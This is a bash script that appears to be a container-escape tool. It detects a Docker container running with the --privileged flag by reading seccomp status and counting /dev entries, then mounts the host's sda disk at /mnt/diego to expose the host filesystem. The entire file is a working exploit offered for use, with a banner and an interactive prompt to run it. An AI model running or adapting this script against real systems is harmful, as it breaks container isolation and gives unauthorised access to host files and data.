#!/bin/bash

function banner () {
    ban="
 +-+-+-+-+-+-+-+-+-+-+-+-+
 |-|-|p|r|i|v|i|l|e|g|e|d|
 +-+-+-+-+-+-+-+-+-+-+-+-+

         "

         echo -e "$ban"
}

function exploit () {
    echo "[+] Trying to exploit..."
    device=$(df -h | grep sda | cut -d " " -f1)
    mkdir -p /mnt/diego
    mount $device /mnt/diego
    ls -la /mnt/diego
    echo "[!] Exploit executed. Check /mnt/diego"
}

banner
echo "[+] Checking if the --privileged flag is set..."

declare -i cont=0

outputSec=$(cat /proc/1/status | grep -i "seccomp" | cut -d ":" -f2 | base64)
if [ "$outputSec" == "CTAKCTAK" ]; then
    cont=$((cont + 1))
fi

filesDev=$(ls /dev | wc -l)
if [ $filesDev -gt 100 ]; then
    cont=$((cont + 1))
fi


if [ $cont -eq "2" ]; then
    echo "[+] The --privileged flag probably is set"
    exploit
elif [ $cont -eq "1" ]; then
    echo "[+] There is chance that the --privileged flag is not set. Want to try to exploit anyway? [y/n]"
    read value
    if [ "$value" == "y" ]; then
        exploit
    else
        echo "[+] Quitting"
        exit
    fi
else
    echo "[+] The --privileged flag is not set."
    exit
fi
